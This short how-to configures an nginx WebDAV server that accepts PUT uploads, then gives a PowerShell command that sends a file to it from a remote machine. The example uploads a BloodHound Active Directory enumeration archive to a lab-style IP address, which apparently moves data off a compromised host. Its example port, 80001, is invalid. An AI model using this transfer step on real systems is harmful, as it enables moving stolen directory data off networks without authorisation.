# How to create a webdav server with nginx



Go to /etc/nginx/sites-available and create a file called webdav with:

    server{
            listen 8001 default_server;
            server_name webdav.server;
            location / {
                root /var/www/upload;
                dav_methods PUT;
            }
    }


Then create the /var/www/upload directory

    sudo mkdir /var/www/upload
    sudo chmod 776 /var/www/upload

Create a symbolic link in sites-enabled

    cd /etc/nginx/sites-enabled
    sudo ln -s /etc/nginx/sites-available/webdav

Restart nginx

    sudo systemctl restart nginx

Finally check if server is up and listening on port 8001

    ss -nltp

## Upload a file from remote host to the webdav server using powershell

    Invoke-WebRequest -uri http://<webdav_server_ip>:<web_davserver_port>/<file_name_to_be_saved_in_the_server> -Method Put -Infile <path_to_file_we_want_to_upload>

    Invoke-Webrequest -uri http://10.10.14.105:80001/bh.zip -Method Put -Infile 20241112043034_BloodHound.zip